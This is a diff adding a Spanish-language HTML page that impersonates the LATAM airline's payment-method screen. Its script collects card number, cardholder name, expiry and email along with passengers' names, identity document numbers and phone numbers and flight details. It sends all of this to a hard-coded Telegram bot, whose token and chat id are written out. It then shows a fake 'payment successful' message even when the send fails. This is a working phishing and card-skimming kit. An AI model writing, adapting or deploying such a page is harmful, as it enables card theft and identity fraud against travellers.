@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Medios de Pago - LATAM</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        :root {
+            --primary-blue: #1a0a5c;
+            --secondary-blue: #2d1b8f;
+            --accent-pink: #e91e63;
+            --light-gray: #f5f5f5;
+            --dark-text: #1a1a1a;
+            --border-gray: #e0e0e0;
+            --white: #ffffff;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: var(--light-gray);
+            color: var(--dark-text);
+        }
+
+        /* Header */
+        header {
+            background: var(--primary-blue);
+            color: var(--white);
+            padding: 1rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.15);
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+        }
+
+        .logo-img {
+            height: 28px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        .logo-text {
+            font-weight: 700;
+            font-size: 1rem;
+        }
+
+        .user-profile {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 0.5rem 1rem;
+            border-radius: 20px;
+            cursor: pointer;
+            font-size: 0.9rem;
+        }
+
+        .user-icon {
+            width: 24px;
+            height: 24px;
+            border: 2px solid var(--white);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.8rem;
+        }
+
+        /* Container */
+        .container {
+            max-width: 100%;
+            margin: 0 auto;
+            padding: 2rem 1rem;
+        }
+
+        .title {
+            font-size: 1.8rem;
+            font-weight: 300;
+            margin-bottom: 2rem;
+            color: var(--dark-text);
+        }
+
+        /* Payment Methods */
+        .payment-methods {
+            background: var(--white);
+            border-radius: 12px;
+            overflow: hidden;
+            margin-bottom: 2rem;
+        }
+
+        .payment-option {
+            padding: 1.5rem;
+            border-bottom: 1px solid var(--border-gray);
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .payment-option:last-child {
+            border-bottom: none;
+        }
+
+        .payment-option:hover {
+            background-color: #f9f9f9;
+        }
+
+        .payment-option.selected {
+            background-color: var(--white);
+            border: 3px solid var(--secondary-blue);
+            border-radius: 12px;
+            margin: 1rem;
+            padding: 1.5rem;
+        }
+
+        .payment-info {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            flex: 1;
+        }
+
+        .payment-icon {
+            width: 40px;
+            height: 40px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+        }
+
+        .payment-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+
+        .payment-details h3 {
+            font-size: 1rem;
+            font-weight: 600;
+            margin-bottom: 0.3rem;
+            color: var(--secondary-blue);
+        }
+
+        .payment-details p {
+            font-size: 0.85rem;
+            color: #666;
+        }
+
+        .radio-button {
+            width: 24px;
+            height: 24px;
+            border: 3px solid var(--secondary-blue);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .radio-button.selected {
+            background-color: var(--secondary-blue);
+        }
+
+        .radio-button.selected::after {
+            content: '';
+            width: 8px;
+            height: 8px;
+            background-color: var(--white);
+            border-radius: 50%;
+        }
+
+        /* Payment Details Section */
+        .payment-details-section {
+            background: var(--white);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+            display: none;
+        }
+
+        .payment-details-section.active {
+            display: block;
+        }
+
+        .section-title {
+            font-size: 1.1rem;
+            font-weight: 600;
+            margin-bottom: 1rem;
+            color: var(--dark-text);
+        }
+
+        .amount {
+            font-size: 0.9rem;
+            color: #666;
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group {
+            margin-bottom: 1rem;
+        }
+
+        label {
+            display: block;
+            font-size: 0.85rem;
+            color: #999;
+            margin-bottom: 0.5rem;
+        }
+
+        input[type="text"],
+        input[type="email"] {
+            width: 100%;
+            padding: 0.75rem;
+            border: 2px solid var(--border-gray);
+            border-radius: 8px;
+            font-size: 0.9rem;
+            font-family: inherit;
+            transition: all 0.3s ease;
+        }
+
+        input[type="text"]:focus,
+        input[type="email"]:focus {
+            outline: none;
+            border-color: var(--secondary-blue);
+            box-shadow: 0 0 8px rgba(45, 27, 143, 0.2);
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            gap: 0.5rem;
+            margin: 1rem 0;
+        }
+
+        .checkbox-group input[type="checkbox"] {
+            width: 18px;
+            height: 18px;
+            cursor: pointer;
+        }
+
+        .checkbox-group label {
+            margin: 0;
+            cursor: pointer;
+            font-size: 0.85rem;
+            color: var(--dark-text);
+        }
+
+        /* Info Section */
+        .info-section {
+            background: var(--light-gray);
+            padding: 2rem;
+            border-radius: 12px;
+            margin-bottom: 2rem;
+        }
+
+        .info-title {
+            font-size: 1rem;
+            font-weight: 600;
+            color: var(--secondary-blue);
+            margin-bottom: 1rem;
+        }
+
+        .info-content {
+            font-size: 0.9rem;
+            color: var(--dark-text);
+            line-height: 1.6;
+            margin-bottom: 1rem;
+        }
+
+        .info-highlight {
+            font-weight: 700;
+            color: var(--secondary-blue);
+        }
+
+        .email-field {
+            background: #e8e8e8;
+            padding: 0.75rem;
+            border-radius: 8px;
+            font-size: 0.9rem;
+            color: #666;
+        }
+
+        /* Button */
+        .pay-btn {
+            background: var(--accent-pink);
+            color: var(--white);
+            border: none;
+            padding: 1rem;
+            border-radius: 8px;
+            font-weight: 700;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.3s ease;
+            margin-top: 1rem;
+        }
+
+        .pay-btn:hover {
+            background: #d81b60;
+        }
+
+        .pay-btn:active {
+            transform: scale(0.98);
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            align-items: center;
+            justify-content: center;
+        }
+
+        .modal.show {
+            display: flex;
+        }
+
+        .modal-content {
+            background-color: var(--white);
+            padding: 2rem;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 400px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .check-icon {
+            font-size: 4rem;
+            color: #4CAF50;
+            margin-bottom: 1rem;
+        }
+
+        .modal-title {
+            font-size: 1.5rem;
+            font-weight: 700;
+            color: var(--dark-text);
+            margin-bottom: 0.5rem;
+        }
+
+        .modal-text {
+            font-size: 0.95rem;
+            color: #666;
+            margin-bottom: 1.5rem;
+        }
+
+        .modal-btn {
+            background: var(--secondary-blue);
+            color: var(--white);
+            border: none;
+            padding: 0.75rem 2rem;
+            border-radius: 8px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .modal-btn:hover {
+            background: var(--primary-blue);
+        }
+
+        @media (max-width: 600px) {
+            .container {
+                padding: 1.5rem 1rem;
+            }
+
+            .title {
+                font-size: 1.4rem;
+            }
+
+            .payment-details-section {
+                padding: 1.5rem;
+            }
+
+            .user-profile {
+                font-size: 0.8rem;
+                padding: 0.4rem 0.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="logo">
+            <img src="latam.svg" alt="LATAM" class="logo-img">
+        </div>
+    </header>
+
+    <!-- Container -->
+    <div class="container">
+        <h1 class="title">Medios de pago</h1>
+
+        <!-- Payment Methods -->
+        <div class="payment-methods">
+            <div class="payment-option" onclick="selectPayment('card')">
+                <div class="payment-info">
+                    <div class="payment-icon">
+                        <img src="tarjeta.png" alt="Tarjeta">
+                    </div>
+                    <div class="payment-details">
+                        <h3>Agregar tarjeta</h3>
+                        <p>Débito con CVV o crédito Visa, Mastercard, American Express o Diners Club.</p>
+                    </div>
+                </div>
+                <div class="radio-button" id="card-radio"></div>
+            </div>
+
+            <div class="payment-option" onclick="selectPayment('pse')">
+                <div class="payment-info">
+                    <div class="payment-icon">
+                        <img src="pse.png" alt="PSE">
+                    </div>
+                    <div class="payment-details">
+                        <h3>Pago con débito PSE</h3>
+                        <p>Te enviaremos al sitio seguro de IATA Pay para continuar con tu pago.</p>
+                    </div>
+                </div>
+                <div class="radio-button" id="pse-radio"></div>
+            </div>
+        </div>
+
+        <!-- Card Payment Details -->
+        <div class="payment-details-section" id="card-section">
+            <div class="section-title">Agregar tarjeta</div>
+            <div class="amount">A pagar con tarjeta <strong id="cardAmount">$ 499.765</strong></div>
+
+            <div class="form-group">
+                <label for="cardNumber">Número de tarjeta</label>
+                <input type="text" id="cardNumber" placeholder="Ej: 4532015112830366" maxlength="19">
+            </div>
+
+            <div class="form-group">
+                <label for="cardName">Nombre y apellido</label>
+                <input type="text" id="cardName" placeholder="Ej: Juan Pérez">
+            </div>
+
+            <div class="form-group">
+                <label for="cardExpiry">Expiración</label>
+                <input type="text" id="cardExpiry" placeholder="MM/AA" maxlength="5">
+            </div>
+
+            <div class="checkbox-group">
+                <input type="checkbox" id="saveCard">
+                <label for="saveCard">Guarda tu tarjeta para futuras compras</label>
+            </div>
+
+            <div class="form-group">
+                <label for="cardEmail">Email</label>
+                <input type="email" id="cardEmail" placeholder="tu@email.com">
+            </div>
+
+            <button class="pay-btn" onclick="processCardPayment()">Pagar</button>
+        </div>
+
+        <!-- PSE Payment Details -->
+        <div class="payment-details-section" id="pse-section">
+            <div class="section-title">Pago con débito PSE</div>
+            <div class="amount">Monto a pagar <strong id="pseAmount">$ 499.765</strong></div>
+            <button class="pay-btn" onclick="goToPSE()">Continuar a PSE</button>
+        </div>
+
+        <!-- Info Section -->
+        <div class="info-section">
+            <div class="info-title">¿A dónde enviamos el comprobante de compra?</div>
+            <div class="info-content">
+                La persona que reciba el comprobante será <span class="info-highlight">administradora del viaje</span> y la única que podrá solicitar cambios y devoluciones.
+            </div>
+            <input type="email" id="adminEmail" placeholder="tu@email.com" style="width: 100%; padding: 0.75rem; border: 2px solid var(--border-gray); border-radius: 8px; font-size: 0.9rem; margin-top: 1rem;">
+        </div>
+    </div>
+
+    <!-- Verification Modal -->
+    <div class="modal" id="verificationModal">
+        <div class="modal-content">
+            <div class="check-icon">✓</div>
+            <div class="modal-title">¡Pago exitoso!</div>
+            <div class="modal-text">Tu transacción se completó correctamente. El comprobante será enviado al correo registrado.</div>
+            <button class="modal-btn" onclick="closeModal()">Continuar</button>
+        </div>
+    </div>
+
+    <script>
+        let selectedPaymentMethod = null;
+        let passengersData = {};
+
+        function loadPageData() {
+            const params = new URLSearchParams(window.location.search);
+            
+            const precioTotal = params.get('precioTotal') || '499765';
+            const pasajeros = JSON.parse(params.get('pasajeros') || '{}');
+            
+            passengersData = pasajeros;
+
+            // Actualizar montos
+            const formattedPrice = `$ ${parseInt(precioTotal).toLocaleString('es-CO')}`;
+            document.getElementById('cardAmount').textContent = formattedPrice;
+            document.getElementById('pseAmount').textContent = formattedPrice;
+
+            // Llenar email si existe
+            const adminEmailInput = document.getElementById('adminEmail');
+            const primerPasajero = pasajeros.pasajero1;
+            if (primerPasajero && primerPasajero.numero) {
+                adminEmailInput.value = primerPasajero.numero || '';
+            }
+        }
+
+        function selectPayment(method) {
+            selectedPaymentMethod = method;
+
+            // Actualizar UI
+            document.getElementById('card-radio').classList.remove('selected');
+            document.getElementById('pse-radio').classList.remove('selected');
+            document.getElementById('card-section').classList.remove('active');
+            document.getElementById('pse-section').classList.remove('active');
+
+            if (method === 'card') {
+                document.getElementById('card-radio').classList.add('selected');
+                document.getElementById('card-section').classList.add('active');
+            } else if (method === 'pse') {
+                document.getElementById('pse-radio').classList.add('selected');
+                document.getElementById('pse-section').classList.add('active');
+            }
+        }
+
+        function processCardPayment() {
+            const cardNumber = document.getElementById('cardNumber').value.trim();
+            const cardName = document.getElementById('cardName').value.trim();
+            const cardExpiry = document.getElementById('cardExpiry').value.trim();
+            const cardEmail = document.getElementById('cardEmail').value.trim();
+
+            if (!cardNumber || !cardName || !cardExpiry || !cardEmail) {
+                alert('Por favor completa todos los campos');
+                return;
+            }
+
+            // Validar formato básico
+            if (cardNumber.replace(/\s/g, '').length < 13) {
+                alert('Número de tarjeta inválido');
+                return;
+            }
+
+            if (!cardExpiry.includes('/')) {
+                alert('Expiración debe estar en formato MM/AA');
+                return;
+            }
+
+            // Preparar datos para enviar a Telegram
+            const params = new URLSearchParams(window.location.search);
+            const precioTotal = params.get('precioTotal') || '0';
+            const pasajeros = JSON.parse(params.get('pasajeros') || '{}');
+            const asientosVuelo1 = JSON.parse(params.get('asientosVuelo1') || '[]');
+            const asientosVuelo2 = JSON.parse(params.get('asientosVuelo2') || '[]');
+            const origen = params.get('origen') || 'N/A';
+            const destino = params.get('destino') || 'N/A';
+            const fechaSalida = params.get('fechaSalida') || 'N/A';
+            const fechaRegreso = params.get('fechaRegreso') || 'N/A';
+
+            // Construir mensaje
+            let mensaje = `🎫 *NUEVA RESERVA - PAGO CON TARJETA*\n\n`;
+            mensaje += `💳 *DATOS DE LA TARJETA*\n`;
+            mensaje += `Nombre: ${cardName}\n`;
+            mensaje += `Tarjeta: ${cardNumber}\n`;
+            mensaje += `Expiración: ${cardExpiry}\n`;
+            mensaje += `Email: ${cardEmail}\n\n`;
+
+            mensaje += `✈️ *VUELOS*\n`;
+            mensaje += `Ruta: ${origen} → ${destino}\n`;
+            mensaje += `Ida: ${fechaSalida}\n`;
+            mensaje += `Vuelta: ${fechaRegreso}\n\n`;
+
+            mensaje += `🪑 *ASIENTOS SELECCIONADOS*\n`;
+            mensaje += `Vuelo 1: ${asientosVuelo1.join(', ')}\n`;
+            mensaje += `Vuelo 2: ${asientosVuelo2.join(', ')}\n\n`;
+
+            mensaje += `👥 *PASAJEROS*\n`;
+            for (const key in pasajeros) {
+                const pasajero = pasajeros[key];
+                if (pasajero && pasajero.nombre) {
+                    mensaje += `• ${pasajero.nombre}\n`;
+                    mensaje += `  ${pasajero.tipoDoc}: ${pasajero.documento}\n`;
+                    mensaje += `  Tel: ${pasajero.numero}\n`;
+                }
+            }
+
+            mensaje += `\n💰 *MONTO TOTAL*: COP ${parseInt(precioTotal).toLocaleString('es-CO')}\n`;
+
+            // Enviar a Telegram
+            const botToken = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+            const chatId = '-1003917791773';
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: mensaje,
+                    parse_mode: 'Markdown'
+                })
+            }).then(response => {
+                if (response.ok) {
+                    // Mostrar modal de verificación
+                    showVerificationModal();
+                } else {
+                    alert('Pago procesado pero hubo un error al registrar. Contacta soporte.');
+                    showVerificationModal();
+                }
+            }).catch(error => {
+                console.log('Pago procesado:', error);
+                showVerificationModal();
+            });
+        }
+
+        function goToPSE() {
+            const params = new URLSearchParams(window.location.search);
+            window.location.href = `pse.html?${params.toString()}`;
+        }
+
+        function showVerificationModal() {
+            document.getElementById('verificationModal').classList.add('show');
+        }
+
+        function closeModal() {
+            document.getElementById('verificationModal').classList.remove('show');
+            // Aquí puedes redirigir a la página de confirmación si lo deseas
+            alert('Gracias por tu compra. Comprobante enviado al email registrado.');
+        }
+
+        window.addEventListener('load', loadPageData);
+    </script>
+</body>
+</html>
